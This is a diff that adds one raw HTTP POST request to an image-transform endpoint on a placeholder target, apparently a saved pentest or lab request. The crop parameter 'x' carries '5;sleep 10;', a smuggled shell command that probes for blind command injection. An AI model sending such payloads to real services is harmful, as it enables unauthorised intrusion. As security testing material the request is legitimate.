@@ -1,0 +1,16 @@
+POST /apply_visual_transform HTTP/1.1
+Host: <target_IP>:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://<target_IP>:8000/
+Content-Type: application/json
+Content-Length: 134
+Origin: http://<target_IP>:8000
+Connection: keep-alive
+Cookie: session=[REDACTED]
+
+Priority: u=0
+
+{"imageId":"9de47f46-edf5-4485-864b-af325261921c","transformType":"crop","params":{"x":"5;sleep 10;","y":4,"width":1098,"height":931}}
